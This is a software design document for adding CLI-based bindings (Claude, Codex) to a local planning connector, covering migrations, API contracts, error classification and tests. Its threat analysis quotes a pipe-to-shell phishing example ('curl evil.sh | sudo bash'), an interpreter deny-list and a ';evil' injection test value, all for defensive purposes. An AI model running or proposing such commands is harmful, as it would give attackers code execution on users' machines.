# Path B design — Subscription CLI Bridge

**Status**: design v2 · 2026-04-23 · `[agent:feature-planner]`
**Gates**: implementation slices S1–S5 are blocked until this doc is approved by the owner.
**Refines**: extends 2026-04-17 `subscription-connector-mvp.md` MVP. Materially refines DECISIONS 2026-04-17 "Subscription path starts with local connector pairing", 2026-04-17 "Personal account bindings", 2026-04-22 "Dual-runtime mode" (Path B is gated to local mode, see §10).
**Inputs**: 2026-04-17 `subscription-connector-mvp.md`, 2026-04-17 `credential-binding-design.md`, 2026-04-20 `local-connector-context.md`, current adapter at `adapters/backlog_adapter.py`, current connector at `backend/internal/connector/`, existing migrations 014 / 015 / 018 / 019.
**v2 changelog**: addresses critic + risk-reviewer findings on the v1 draft. Six material changes — see §18.

---

## 1. Problem statement

The `subscription-connector-mvp.md` MVP shipped between 2026-04-17 and 2026-04-22:

- `local_connectors` + `connector_pairing_sessions` tables exist
- `anpm-connector pair / serve / doctor` daemon works end-to-end
- `claim-next-run` returns sanitized `wire.PlanningContextV1`
- `submit-result` writes back candidates and emits SSE notification
- `adapters/backlog_adapter.py` shells out to the user's local `claude` or `codex` CLI

But the **subscription path is still operationally invisible**. The user must:

1. Know there is an env var `ANPM_ADAPTER_AGENT=codex` to switch from Claude to Codex
2. Pass `--adapter-command /path/to/adapter` and `--adapter-arg ...` flags to `anpm-connector serve` correctly
3. Diagnose adapter failures by reading subprocess stderr — there is no UI surface for this
4. Have already authenticated `claude` / `codex` on the host before pairing

The **operator question that has no UI answer today**:
> "Which CLI is my connector going to use for the next planning run, and is it healthy?"

There is also no UI feedback when a planning run fails because the underlying CLI session expired — the user sees a generic "planning failed" notification with a truncated error string.

The **scope creep risk**: the project owner only has Claude Code CLI + Mistral API key + (claimed) Codex CLI. Building support for Copilot CLI / VS Code subscription extraction is a separate, much larger problem (the 2026-04-17 ADR explicitly excluded this from MVP and that exclusion still stands).

## 2. Current state inventory (verified 2026-04-23)

### 2.1 Adapter contract (`exec-json`)

- **stdin** — `{run, requirement, requested_max_candidates, planning_context}` per `adapters/backlog_adapter.py:8–24`
- **stdout** — `{candidates: [...], error_message: ""}` per `adapters/backlog_adapter.py:26–42`
- **env vars** — `ANPM_ADAPTER_AGENT` (`claude` | `codex`), `ANPM_ADAPTER_MODEL`, `ANPM_ADAPTER_TIMEOUT`, `ANPM_ADAPTER_DEBUG` (`adapters/backlog_adapter.py:44–48`)

### 2.2 Connector daemon

- subcommands: `pair`, `serve`, `doctor` (`backend/internal/connector/app.go:41–75`)
- adapter flags persisted into state: `--adapter-command`, `--adapter-arg`, `--adapter-working-dir`, `--adapter-timeout`, `--adapter-max-output-bytes`
- state file: `--state-path` > `$ANPM_CONNECTOR_STATE_PATH` > `$XDG_CONFIG_HOME/agent-native-pm/connector.json`, mode `0600`

### 2.3 Server dispatch / lease

- `claim-next-run` returns `{Run, Requirement, Project, PlanningContext}` (`backend/internal/handlers/local_connectors.go:144–179`)
- lease duration: 10 minutes
- run is selected as oldest queued across the connector owner's account (not per-project)
- `submit-result` accepts `{Success, ErrorMessage, Candidates, CliInfo}` (`backend/internal/models/local_connector.go`)

### 2.4 Account bindings — **current schema we must reuse**

`account_bindings` columns (`migrations/014` + `015`):
```
id, user_id, provider_id, label, base_url, model_id,
configured_models, api_key_ciphertext, api_key_configured,
is_active, created_at, updated_at
```

Constraints:
- UNIQUE `(user_id, provider_id, label)` — multiple bindings per provider allowed at row level
- **Partial unique index `idx_account_bindings_active_unique` ON `(user_id, provider_id) WHERE is_active = TRUE`** — only ONE active binding per `(user_id, provider_id)` per migration `015_planning_run_binding_audit.sql`. This forbids "Work Claude + Personal Claude both active" (see D6).

Current `provider_id` value in production: `"openai-compatible"` only.

### 2.5 Planning runs — **existing per-run audit columns we will reuse**

Per migrations `015`, `018`, `019`, `planning_runs` already has:

| Column | From | Type | Purpose | Reuse for Path B? |
|---|---|---|---|---|
| `binding_source` | 015 | TEXT, default 'system' | `system` / `shared` / `personal` | ✅ extend semantics — `personal` covers CLI bindings |
| `binding_label` | 015 | TEXT, default '' | Label of personal binding when used | ✅ already used |
| `adapter_type` | 018 | TEXT, nullable | Per-run adapter type override (`claude` / `codex` / etc.) | ✅ load-bearing — Path B writes here |
| `model_override` | 018 | TEXT, nullable | Per-run model ID override | ✅ load-bearing — Path B writes here |
| `connector_cli_info` | 019 | TEXT (JSON), nullable | CLI usage info from adapter (already used as JSON blob) | ✅ extend with binding snapshot fields |

**This is a major reconciliation vs the v1 draft.** v1 proposed `cli_binding_id`, `cli_binding_snapshot`, `error_kind`, `remediation_hint` as new columns. v2 reuses 018/019 columns where possible and adds only one new nullable column (`account_binding_id`) plus adapter-side enum classification.

### 2.6 Planning provider registry

- `Provider.Generate(ctx, requirement, planningContext, selection)` (`backend/internal/planning/provider.go:36–38`)
- execution modes: `deterministic`, `server_provider`, `local_connector`
- `local_connector` requires at least one non-revoked paired connector for the requesting user

### 2.7 Citable prior art

- DECISIONS 2026-04-17 — Subscription path starts with local connector pairing
- DECISIONS 2026-04-17 — Personal account bindings alongside shared planning settings
- DECISIONS 2026-04-17 — Centralize planning model configuration
- DECISIONS 2026-04-20 — Local connector is user-scoped, serves all of a user's projects
- DECISIONS 2026-04-20 — Ship reference `adapters/backlog_adapter.py`
- DECISIONS 2026-04-20 — Adopt `context.v1` as connector planning context contract
- DECISIONS 2026-04-22 — `Provider.Generate` takes `context.Context`
- DECISIONS 2026-04-22 — Dual-runtime mode (local SQLite, server PostgreSQL) ← **gates Path B scope, see §10**

## 3. End state

A **first-class CLI binding** concept that sits beside today's API-key-based account bindings, **available only in local mode** (see §10):

```
My Bindings page (/me/bindings)
┌─────────────────────────────────────────────────────────────────┐
│ API-key bindings                                                │
│   • Mistral (mistral-cloud) · model: mistral-small-latest · ✓  │
│                                                                 │
│ CLI bindings (local mode only)                                  │
│   • Claude Code CLI · model: claude-sonnet-4-6 · ✓ healthy     │
│       Last used: 2 min ago · Connector: My Mac                 │
│   • Codex CLI · model: gpt-5.4 · ⚠ session expired             │
│       Hint: Run `codex login` on the connector host             │
└─────────────────────────────────────────────────────────────────┘
```

When the operator starts a planning run, the **execution-mode picker** shows actually available CLIs with their health.

The connector daemon picks up the per-run **CLI selection** from the claim response and invokes the right adapter command, instead of relying on a host-side env var.

When the adapter fails because the CLI session expired or rate-limited, the **failure surface** shows a server-rendered remediation hint (server-owned catalog, not adapter-supplied free text — see D7).

### 3.1 What changes vs today

| Concern | Today | End state |
|---|---|---|
| CLI selection | Host env var `ANPM_ADAPTER_AGENT` (or per-run `adapter_type` from migration 018, but no UI) | Per-binding config in `account_bindings`; per-run `account_binding_id` resolved at run-creation |
| CLI visibility in UI | None | "CLI bindings" section in My Bindings page (local mode only) |
| CLI health check | None | Periodic `<cli> --version` probe via connector heartbeat (no LLM call — see D5 update) |
| Per-run CLI choice | `adapter_type` column exists since 018 but no API surface | `POST /api/requirements/:id/planning-runs` accepts `account_binding_id`; defaults to user's primary CLI binding |
| Failure messages | Raw subprocess stderr truncated to 240 chars | Adapter emits typed `error_kind` enum; server renders canonical remediation hint from a server-side catalog (D7) |
| Multi-CLI per user | Multiple connectors needed | Single connector routes to any healthy CLI binding the user owns |
| Audit trail | `binding_source`, `binding_label`, `adapter_type`, `model_override`, `connector_cli_info` exist but only partially populated for connector dispatch | All five columns consistently written + `account_binding_id` reference added |
| Backwards compat with old connectors | n/a | Server tags connectors with `protocol_version` at pairing; refuses to dispatch a CLI-bound run to a pre-Path-B connector (R3 mitigation) |

### 3.2 What stays exactly the same

- `wire.PlanningContextV1` schema and 256 KiB cap on `planning_context`
- `claim-next-run` / `submit-result` HTTP envelope structure (additive only)
- `Provider.Generate` interface
- The 10-minute lease window
- The single-process per-connector serial execution model
- Pairing-code one-use + connector-token separation
- `ANPM_ADAPTER_*` env vars work as a fallback (D4)
- Existing `binding_source` / `binding_label` / `adapter_type` / `model_override` / `connector_cli_info` columns and their semantics — Path B fills them in more cases, never overwrites their meaning.

## 4. Non-goals

1. **Copilot CLI / VS Code session extraction.** Same reason as the 2026-04-17 MVP exclusion.
2. **WebSocket / push-based CLI health.** Heartbeat-piggyback is enough.
3. **Capability-aware routing across connectors.** Multi-device problem the owner does not have.
4. **Adapter sandbox / containerization.** The CLIs run on the user's own machine with the user's own credentials.
5. **OAuth-style "log in via Claude" inside the web app.** The CLIs own auth.
6. **Cost / token accounting.** Subscriptions are flat-rate from the operator's perspective.
7. **Auto-retry of failed runs.** Would mask configuration problems.
8. **Per-project CLI bindings.** User-scoped per the 2026-04-20 connector ADR.
9. **Cross-user CLI binding sharing.** Each user owns their bindings.
10. **CLI bindings in server mode.** Out of scope for Path B (see §10 threat model). A future design with admin-managed binary allowlists could lift this; not now.
11. **Multi-active bindings per CLI provider.** Existing `idx_account_bindings_active_unique` (migration 015) forbids it. v1 draft's D6 was incompatible with this index; D6 dropped in v2 (see §5).

## 5. Resolved design decisions

The earlier draft posed six open questions. Five resolved per owner approval; one (D6) dropped due to schema conflict found in critic review. Two new decisions added (D7, D8) from the v2 reconciliation pass.

### D1 — Extend `account_bindings`, do not introduce a new `cli_bindings` table

**Resolution**: extend.

**Rationale**: 90% schema overlap; new table would duplicate per-user uniqueness logic, CRUD endpoints, credential-mode resolution, and the `/api/me/account-bindings` route surface.

**Constraints introduced**:
- `provider_id` MUST start with `cli:` for CLI-based bindings.
- For `provider_id LIKE 'cli:%'`: `base_url` MUST be empty AND `api_key_ciphertext` MUST be empty (server-side validation).
- Allowed `cli:*` values in v1: `cli:claude`, `cli:codex`. Adding `cli:copilot` etc. requires a new DECISIONS entry **AND** a code-side allowlist update; CI rule (see §10) blocks allowlist changes that lack a paired DECISIONS diff.

### D2 — Per-run CLI selection with explicit `is_primary` flag

**Resolution**: per-run `account_binding_id` on the planning-run request; absent → server picks the user's primary CLI binding.

**v2 change vs v1**: "primary" is now an **explicit `is_primary BOOLEAN`** column on `account_bindings` (migration 021), not "most-recently-updated_at" — that ordering had a race (concurrent runs touch updated_at, failed runs don't update, see critic finding 8).

**Rules**:
- At most one `is_primary = TRUE` per `(user_id, provider_id_prefix)` where prefix is `cli` for `cli:*` bindings, `api` for everything else. Enforced by partial unique index in migration 021.
- When a user creates their first `cli:claude` binding, it auto-becomes primary. Same for `cli:codex`.
- User can flip primary in the UI (S3).
- "Primary" resolution is namespace-scoped to ONE primary CLI binding per user, regardless of which `cli:*` provider it points at. The partial unique index in §6.1 enforces this via `CASE WHEN provider_id LIKE 'cli:%' THEN 'cli' ELSE 'api' END` — `cli:claude` and `cli:codex` share one "cli" namespace slot. To switch the launcher's default from Claude to Codex, the user flips primary on the Codex binding (one click in S3); the previously-primary Claude binding is auto-demoted within the same TX.

### D3 — `cli_health` lives in `local_connectors.metadata` JSONB, not a new table

**Resolution**: JSONB now; new table only when a concrete query justifies it.

**Constraints introduced**:
- `local_connectors.metadata->>'cli_health'` is reserved. Other metadata keys MUST NOT collide.
- Stale entries (`checked_at` > 5 min) MUST be displayed with a "?" indicator. **v2 add**: at run-creation, server returns a soft warning in the response envelope (`warnings: [{code: "stale_cli_health", binding_id}]`) when picked binding's health is stale (R11).
- Store layer adds typed read/write helpers; no raw JSON path manipulation in handlers.
- On Path B rollback, scrub `local_connectors.metadata.cli_health` (see §13).

### D4 — Env-var fallback (`ANPM_ADAPTER_AGENT`, `ANPM_ADAPTER_MODEL`) kept indefinitely

**Resolution**: keep as a power-user / debugging escape hatch.

**Constraints introduced**:
- Documented precedence: stdin `cli_selection` > env var > adapter built-in default.
- If both stdin selection and env var are present, the connector logs a one-line WARN (not ERROR).

### D5 — Both Claude and Codex preset cards ship in S3

**Resolution**: ship both. Codex preset card carries "Untested by maintainer" annotation (D5 v1).

**Constraints introduced**:
- Claude is default selection in the S3 form.
- A user picking Codex without it installed gets a typed `cli_not_found` failure with a server-rendered "install Codex CLI then pair" hint (per D7).

### D6 — DROPPED — multi-binding per CLI not supported in v1

**v1 proposed**: allow "Work Claude" + "Personal Claude" via existing `(user_id, provider_id, label)` unique constraint.

**v2 finds**: this contradicts `idx_account_bindings_active_unique(user_id, provider_id) WHERE is_active = TRUE` from migration 015. Two active CLI bindings of the same `provider_id` would violate the index.

**Resolution**: align with the existing index. **One active binding per `(user_id, provider_id)`** stays the rule. A user who wants two Claude installs deactivates one to switch — UI shows the inactive one as a "saved alternate".

**Why not modify the index?** The 015 design intent (one active personal binding per provider, per user) is sound for credential resolution and primary-binding semantics. Carving an exception for `cli:%` to allow multi-active would force the launcher picker to disambiguate two bindings with the same provider — bad UX.

**Workaround for the multi-install case**: user keeps two binding rows (different labels), only one active at a time. UI surface in S3 shows "Switch to Personal Claude" button on the inactive row.

### D7 — `remediation_hint` is a server-side catalog, not adapter-supplied free text

**v1 proposed**: adapter emits both `error_kind` and `remediation_hint`; server stores both; UI renders verbatim.

**v2 finds**: this is a phishing channel. Adapter is user-replaceable via `--adapter-command`; a malicious or compromised adapter (or a CLI whose stderr happens to echo attacker text) could emit a hint like `Run: curl evil.sh | sudo bash`. The UI styling makes "Hint:" look like trusted operator instructions.

**Resolution**:
- Adapter emits **only** the `error_kind` enum.
- Server maps `error_kind` → canonical remediation hint via a static Go map.
- The UI renders the server-rendered hint with a fixed "Suggested next step:" prefix (not "Hint:") so the styling cannot be confused with adapter output.
- If `error_kind == "unknown"`, no hint is shown — UI falls back to the truncated `error_message` string only, displayed in a monospace block to telegraph "raw error output, judge for yourself".

**Catalog (initial)**:
```
session_expired       → "Run `<cli> login` on the connector host, then retry."
rate_limited          → "Wait a few minutes and retry, or pick a less-loaded model."
model_not_available   → "Pick a model the CLI exposes (run `<cli> models`)."
cli_not_found         → "Install the <cli> CLI, or set the binding's command path."
cli_timeout           → "Increase ANPM_ADAPTER_TIMEOUT or simplify the requirement."
adapter_protocol_error→ "Update the reference adapter — version mismatch."
unknown               → no hint (falls back to raw error_message)
```

### D8 — Path B is gated to LocalMode only; server mode is out of scope

**v1**: silent on this. Threat model assumed single-operator self-hosted.

**v2 finds**: in server mode, `cli_command` becomes attacker-controlled binary execution under the connector host's identity. The regex allowlist v1 proposed is theatrical — symlinks, interpreter binaries (`/bin/sh`, `/bin/python`), and suid binaries all pass.

**Resolution**:
- S1 validator: `provider_id LIKE 'cli:%'` → reject with 403 if `LocalMode = false`.
- Server-mode `My Bindings` page hides the "CLI bindings" section; in its place renders an info card: "CLI bindings are only available in local-mode deployments. See [link to docs] for details."
- Future expansion to server mode will require a separate design that introduces an admin-managed binary allowlist, deny-list of interpreters, `realpath` resolution, and probably containerized adapter execution. **Not Path B's job.**

**Remaining hardening even in local mode** (see §10):
- Connector-side `realpath` resolution; reject if outside an allowed-roots set.
- Reject if resolved path is in `{sh, bash, zsh, fish, python, python3, node, ruby, perl, env, xargs, sudo}`.
- Reject if resolved binary has setuid/setgid bits.
- Reject if not executable for the current user.

## 6. Information architecture (concrete)

### 6.1 Schema changes — minimal, reusing 018/019

**Migration `021_account_bindings_cli_extensions.sql`** (forward-only; both drivers):
```sql
ALTER TABLE account_bindings
  ADD COLUMN cli_command TEXT NOT NULL DEFAULT '';
ALTER TABLE account_bindings
  ADD COLUMN is_primary BOOLEAN NOT NULL DEFAULT FALSE;

-- enforce one primary per (user_id, provider_id_namespace)
-- "namespace" = 'cli' for cli:* providers, 'api' for others; computed via SQL CASE
CREATE UNIQUE INDEX idx_account_bindings_primary_unique
  ON account_bindings(user_id,
                      CASE WHEN provider_id LIKE 'cli:%' THEN 'cli' ELSE 'api' END)
  WHERE is_primary = TRUE;
```

**Migration `022_planning_runs_account_binding_id.sql`** (forward-only; both drivers):
```sql
ALTER TABLE planning_runs
  ADD COLUMN account_binding_id TEXT;  -- nullable; references account_bindings(id) without FK to allow snapshot-only audit after binding deletion
CREATE INDEX idx_planning_runs_account_binding ON planning_runs(account_binding_id);
```

**Migration `023_local_connectors_protocol.sql`** (forward-only; both drivers):
```sql
ALTER TABLE local_connectors
  ADD COLUMN protocol_version INTEGER NOT NULL DEFAULT 0;
-- 0 = pre-Path-B (does not understand cli_binding in claim response)
-- 1 = Path B / S2-aware
```

**No migration for `error_kind` / `remediation_hint`** — both flow through existing `connector_cli_info` JSON column (extended schema; see §6.2). This avoids an extra migration and keeps the audit blob unified.

**No migration for `cli_health`** — uses `local_connectors.metadata` JSONB (D3).

**SQLite caveat**: `ALTER TABLE … ADD COLUMN` on `modernc.org/sqlite` does NOT support `IF NOT EXISTS` in older versions. The project's existing migration runner (`backend/internal/database/migrations.go`) tracks applied versions in `schema_migrations` and never re-applies. **Do not write `IF NOT EXISTS` on ALTER ADD COLUMN — rely on the runner's idempotency, not SQL-level guards.**

### 6.2 API contracts

#### `POST /api/me/account-bindings` (extended in S1)

Request:
```jsonc
{
  "provider_id": "cli:claude",          // NEW: cli:claude | cli:codex (v1 — see D1 allowlist)
  "label": "My Claude Code",
  "model_id": "claude-sonnet-4-6",
  "configured_models": ["claude-sonnet-4-6", "claude-opus-4-7"],
  "cli_command": "/usr/local/bin/claude", // NEW: optional; empty = PATH lookup
  "is_primary": true                     // NEW: optional, default true on first binding per namespace
}
```

Validation (server-side, S1):
1. `provider_id` MUST be in registered set: `openai-compatible`, `cli:claude`, `cli:codex`.
2. **D8 gate**: `provider_id LIKE 'cli:%'` → reject with 403 if `LocalMode = false`.
3. For `cli:*`: `base_url` empty, `api_key` empty (or absent), `model_id` REQUIRED.
4. `configured_models`: ≤16 entries, each ≤64 chars (envelope budget — R5 mitigation).
5. `cli_command`: if set, MUST match `^/[A-Za-z0-9_./\-]+$` (server-side basic sanity). **Connector-side does the real check** at probe / invocation time (§10): `realpath` resolution, allowed-roots check, interpreter blocklist, setuid/setgid rejection, executability check. Server cannot validate filesystem state of the connector host, so server validation is intentionally minimal sanity-only.
6. `is_primary`: if true, S1 atomically demotes the previous primary in the same `(user_id, namespace)` group within one TX.
7. `(user_id, provider_id, label)` uniqueness from existing constraint.
8. Existing `idx_account_bindings_active_unique` enforces one active per `(user_id, provider_id)` — preserved (see D6 drop).

Response (201): same shape as request plus standard envelope.

#### `POST /api/requirements/:id/planning-runs` (extended in S2)

Request gains optional `account_binding_id`:
```jsonc
{
  "execution_mode": "local_connector",
  "account_binding_id": "uuid"   // NEW: optional; must belong to user, be active, be cli:* OR be the kind matching execution_mode
}
```

Validation (server-side, S2):
- Three-way ownership check: binding exists AND `binding.user_id == requesting user.id == requirement.project.owner` (R2 mitigation — protects against cross-user binding-id confusion in the hypothetical multi-user case even though §10 gates Path B to local mode).
- For `execution_mode == local_connector`: `binding.provider_id LIKE 'cli:%'` AND `binding.is_active = true`.
- If absent AND `execution_mode == local_connector` AND user has ≥1 active `cli:*` binding: server resolves to `is_primary = true` for whichever `cli:*` namespace; if Path B picker passed `adapter_type` separately, use that to scope.
- If absent AND user has zero `cli:*` bindings: `account_binding_id` stays NULL on the run; connector falls back to env var / built-in default (backwards compatible with pre-Path-B connectors).
- **Stale-health soft warning**: if picked binding's `cli_health.checked_at` > 2× probe interval ago, response envelope includes `warnings: [{code: "stale_cli_health", binding_id}]`. The launcher (S4) shows it in-place.

Snapshot at creation time (R8, R10 mitigation — single TX):
- Within the same DB TX as the `INSERT INTO planning_runs`:
  1. SELECT binding by id (row lock optional; we accept eventual consistency on subsequent edits).
  2. Write the run with `account_binding_id`, `binding_source = 'personal'`, `binding_label = binding.label`, `adapter_type = binding.provider_id` (e.g. `cli:claude`), `model_override = binding.model_id`, `connector_cli_info = '{"binding_snapshot": {provider_id, model_id, cli_command, label, is_primary}, ...}'`.
- After commit: touch `account_bindings.last_used_at` (new column? — actually NO; we keep the existing `updated_at` semantics. Primary is explicit per D2 rather than time-derived).

#### `POST /api/connector/pair` (extended in S2)

Connector includes its protocol version in the pair request:
```jsonc
{
  "code": "...",                      // existing
  "label": "My Mac",                  // existing
  "platform": "darwin/arm64",         // existing
  "protocol_version": 1               // NEW
}
```

Server stores `protocol_version` on the `local_connectors` row (migration 023). Old connectors that don't send the field default to `0`.

#### `POST /api/connector/claim-next-run` (response extended in S2)

```jsonc
{
  "run": {...},
  "requirement": {...},
  "project": {...},
  "planning_context": {...},
  "cli_binding": {                      // NEW: optional, present iff run has account_binding_id
    "id": "uuid",
    "provider_id": "cli:claude",
    "model_id": "claude-sonnet-4-6",
    "cli_command": "/usr/local/bin/claude",
    "label": "My Mac Claude"
  }
}
```

**Backwards-compat dispatch rule** (R3 mitigation):
- Server checks `local_connectors.protocol_version` before leasing.
- If run has non-NULL `account_binding_id` AND connector has `protocol_version < 1` → claim returns 200 with **no run** (same as "queue empty"). Run stays queued.
- One-time notification fires for the requesting user: `kind=warning`, message: "Run on requirement X is waiting for an updated connector. Update `anpm-connector` to claim this run."
- Server also marks the run with a `dispatch_warning` flag in `connector_cli_info` so a future heartbeat from an updated connector picks it up immediately.

#### `POST /api/connector/heartbeat` (request extended in S5)

```jsonc
{
  // existing connector token in X-Connector-Token header
  "cli_health": [                       // NEW: optional, repeated
    {
      "binding_id": "uuid",
      "status": "healthy",
      "checked_at": "2026-04-23T01:00:00Z",
      "version_string": "claude 1.5.0",
      "probe_error_message": ""        // NEW in v2: only set when status != healthy; raw probe stderr, NOT classified
    }
  ]
}
```

`status` enum: `healthy`, `session_expired`, `rate_limited`, `cli_not_found`, `unknown`.

**Probe is NOT classified into the same `error_kind` enum as runs (R8 mitigation in v2)**:
- Probe is `<cli_command> --version` only (no LLM call). Cheap, fast, no quota.
- Probe success → `status: "healthy"`.
- Probe `FileNotFoundError` → `status: "cli_not_found"`.
- Probe non-zero exit / timeout → `status: "unknown"` with `probe_error_message` populated.
- "session_expired" / "rate_limited" / "model_not_available" can ONLY be inferred from real-run failures via the run path's `error_kind`. Health probe does NOT impersonate these statuses.

Server stores latest entry per `binding_id` in `local_connectors.metadata`:
```jsonc
{
  "cli_health": {
    "<binding_id>": {
      "status": "...",
      "checked_at": "...",
      "version_string": "...",
      "probe_error_message": ""
    }
  }
}
```

**Cleanup discipline**: when a binding is deleted, server scrubs the matching key from `local_connectors.metadata.cli_health` for ALL of the user's connectors (R12 mitigation, prevents id-reuse aliasing).

**Default probe interval changed in v2**: 5 minutes (was 60s). Reasoning: `--version` is cheap so cost is not the issue, but operator UX doesn't need 60s granularity, and reducing probe frequency narrows the stale-health window vs the 2× warning threshold in D3.

#### `POST /api/connector/planning-runs/:id/result` (request extended in S5)

```jsonc
{
  "success": false,
  "error_message": "claude CLI failed (exit 1): authentication required",
  "error_kind": "session_expired",          // NEW: optional, enum (D7)
  "cli_info": { ... }                       // existing
}
```

`error_kind` enum: `session_expired`, `rate_limited`, `model_not_available`, `cli_not_found`, `cli_timeout`, `adapter_protocol_error`, `unknown`.

**No `remediation_hint` field from adapter (D7)** — server renders the hint from a Go-side static map keyed on `error_kind`. Adapter has no influence on the UI string.

If `error_kind` is missing OR not in the enum, server stores `unknown`; UI falls back to today's truncated `error_message` displayed in a monospace block.

`error_kind` is stored inside the existing `connector_cli_info` JSON column:
```jsonc
{
  "binding_snapshot": {...},   // from §6.5
  "cli_invocation": {
    "exit_code": 1,
    "duration_ms": 4521,
    "command_resolved": "/usr/local/bin/claude"
  },
  "error_kind": "session_expired"
}
```

### 6.3 Adapter stdin (extended in S2)

```jsonc
{
  "run": {...},
  "requirement": {...},
  "requested_max_candidates": 3,
  "planning_context": {...},
  "cli_selection": {                  // NEW: optional, takes precedence over ANPM_ADAPTER_* env vars (D4)
    "provider_id": "cli:claude",
    "model_id": "claude-sonnet-4-6",
    "cli_command": "/usr/local/bin/claude"
  }
}
```

**Envelope size enforcement (R7 mitigation)**: connector asserts the marshalled stdin envelope is ≤ 264 KiB before subprocess spawn (256 KiB planning context + 8 KiB headroom for run/requirement/cli_selection). On overflow: refuse to invoke; submit-result with `success=false`, `error_kind=adapter_protocol_error`.

### 6.4 Adapter stdout (extended in S5)

```jsonc
{
  "candidates": [],
  "error_message": "claude CLI failed (exit 1): authentication required",
  "error_kind": "session_expired"        // NEW (D7); no remediation_hint
}
```

**Adapter classification (in `adapters/backlog_adapter.py`)** — substring match on stderr (English only — see §6.4 caveat) + Python exception class:

| CLI signal | `error_kind` |
|---|---|
| stderr contains `"authentication required"` / `"not authenticated"` / exit 401 | `session_expired` |
| stderr contains `"rate limit"` / `"quota exceeded"` / exit 429 | `rate_limited` |
| stderr contains `"model not found"` / `"no such model"` / `"unknown model"` | `model_not_available` |
| Python `FileNotFoundError` from subprocess spawn | `cli_not_found` |
| Python `subprocess.TimeoutExpired` | `cli_timeout` |
| stdout not parseable as JSON / missing `candidates` field | `adapter_protocol_error` |
| anything else | `unknown` |

**Caveat**: classifier is **English-locale only** by design. Non-English stderr falls through to `unknown`, which is a safe-degrade (R9). The adapter README documents this.

### 6.5 Server-side resolved selection on run creation

(Reconciled with §6.2 above; consolidated for clarity.)

When the server creates a `local_connector` planning run with `account_binding_id`:

1. **Inside one DB transaction**:
   - SELECT the binding row by id with the three-way ownership check (R2).
   - INSERT into `planning_runs` populating: `account_binding_id`, `binding_source = 'personal'`, `binding_label = binding.label`, `adapter_type = binding.provider_id`, `model_override = binding.model_id`, `connector_cli_info` with `binding_snapshot` block.
2. After commit:
   - If picked binding's `cli_health.checked_at` > 2× probe interval, return envelope warning (D3).
   - If user's only active connector has `protocol_version < 1`, return envelope warning AND run will sit queued until update (R3).

The snapshot lives in `connector_cli_info.binding_snapshot` — a JSON sub-block. Decouples the run from later edits / deletion of the binding.

### 6.6 UI surfaces touched

- **`pages/AccountBindings.tsx`** — new "CLI bindings" section (only when LocalMode=true; otherwise info card per D8). Form for `Add CLI binding` with provider preset cards (Claude Code, Codex). Health row per binding (S5). (S3 + S5)
- **`pages/ProjectDetail/planning/PlanningLauncher.tsx`** — CLI binding picker when execution mode is `local_connector`. (S4)
- **`pages/ProjectDetail/planning/CandidateReviewPanel.tsx`** — failure flash banner shows server-rendered "Suggested next step:" when `error_kind` is non-`unknown`; falls back to monospace `error_message` block when `unknown`. (S5)
- **No new pages.** No new top-level routes.

## 7. UI / structural constraints

From the 2026-04-22 ADR:

- New launcher subcomponents (`CliBindingPicker.tsx`) under `frontend/src/pages/ProjectDetail/planning/`.
- New CLI-binding-form components alongside the existing form in `frontend/src/pages/AccountBindings.tsx`. Extract to a sibling component if the file grows past ~600 LOC.
- New helper `frontend/src/utils/cliBindingPresets.ts` mirrors `planningConnectionPresets.ts` shape; ≤100 LOC; Claude + Codex presets only.
- Each new component ships with a smoke test in the same PR.
- All HTTP-touching code respects the dual-runtime constraint.

## 8. Incremental slice plan (v2 — restructured)

**v2 change vs v1**: S5 was claimed independent of S4. v2 critic finding #7 shows they share data (cli_health is read by S4's picker, written by S5's heartbeat). Slice graph restructured: S5 split into S5a (server side: error_kind + remediation catalog) and S5b (health probe + UI surface for health badge), with S5b coming after S4.

### S1 — Data model: extend `account_bindings` for CLI bindings + LocalMode gate

**Scope**:
- Migration `021_account_bindings_cli_extensions.sql` (`cli_command`, `is_primary`, partial unique index).
- `models.AccountBinding` gains `CliCommand`, `IsPrimary`.
- Validation:
  - `provider_id` allowlist: `openai-compatible`, `cli:claude`, `cli:codex`.
  - **D8 LocalMode gate**: `cli:*` rejected with 403 when `LocalMode=false`.
  - `cli_command` regex sanity check (full hardening is connector-side).
  - `configured_models` ≤16 entries × ≤64 chars (R5).
  - `is_primary` atomic demotion of previous primary within TX.
- `docs/api-surface.md` updated.
- **No frontend** in S1.

**Definition of Done — explicit test matrix**:
- T-S1-1: migration applies cleanly under both SQLite + PostgreSQL.
- T-S1-2: POST cli:claude binding in local mode → 201; primary auto-set if first.
- T-S1-3: POST cli:claude binding in server mode → 403 (D8 gate).
- T-S1-4: POST with `cli_command: "/usr/local/bin/claude"` accepted; with `;evil` rejected 400.
- T-S1-5: POST with `configured_models` of 17 entries → 400.
- T-S1-6: POST second cli:claude binding for same user → succeeds (allowed inactive); but if `is_active=true` → 409 from `idx_account_bindings_active_unique`.
- T-S1-7: POST `is_primary=true` on second cli:claude binding → first one auto-demoted.
- T-S1-8: cross-user binding access (user A reads user B's binding via list endpoint) → 404 (existing middleware behavior; explicit regression test).
- T-S1-9: unauthenticated POST → 401.
- T-S1-10: rollback migration drops `cli_command` + `is_primary` + index cleanly under both drivers.

**Size**: M (revised up from S in v1). ~120 LOC backend + 1 migration + 1 down migration + 10 tests.

### S2 — Per-run CLI selection plumbing + protocol version

**Scope**:
- Migration `022_planning_runs_account_binding_id.sql` (new column + index).
- Migration `023_local_connectors_protocol.sql` (`protocol_version` on connectors).
- `models.PlanningRun` gains `AccountBindingID`. `BindingSnapshot` lives inside existing `connector_cli_info` JSON; struct gains `BindingSnapshot` field.
- `POST /api/requirements/:id/planning-runs` accepts `account_binding_id`. Three-way ownership check. Snapshot in single TX (§6.5).
- Primary-binding default resolution.
- `POST /api/connector/pair` accepts `protocol_version`; stores on connector row.
- `claim-next-run` response: `cli_binding` block populated from `connector_cli_info.binding_snapshot`.
- **Backwards-compat dispatch (R3 mitigation)**: claim-next-run returns "no run" + queues a notification when run has `account_binding_id` but connector `protocol_version < 1`.
- Connector `serve` reads `cli_binding`; passes to adapter via stdin `cli_selection`.
- **Connector decoder discipline check**: ensure `json.Decoder` does NOT use `DisallowUnknownFields` (R9 in critic) — explicit test.
- Adapter (`backlog_adapter.py`) parses `cli_selection` with documented precedence (D4); WARN on env-var override.
- Envelope size assertion (R5 / R7) — refuse if marshalled stdin > 264 KiB.
- `docs/api-surface.md` + `docs/local-connector-context.md` updated.

**Definition of Done — explicit test matrix**:
- T-S2-1: migrations apply cleanly under both drivers.
- T-S2-2: run created with `account_binding_id` snapshots binding into `connector_cli_info`.
- T-S2-3: run created without `account_binding_id` AND user has primary cli:claude → primary auto-resolved.
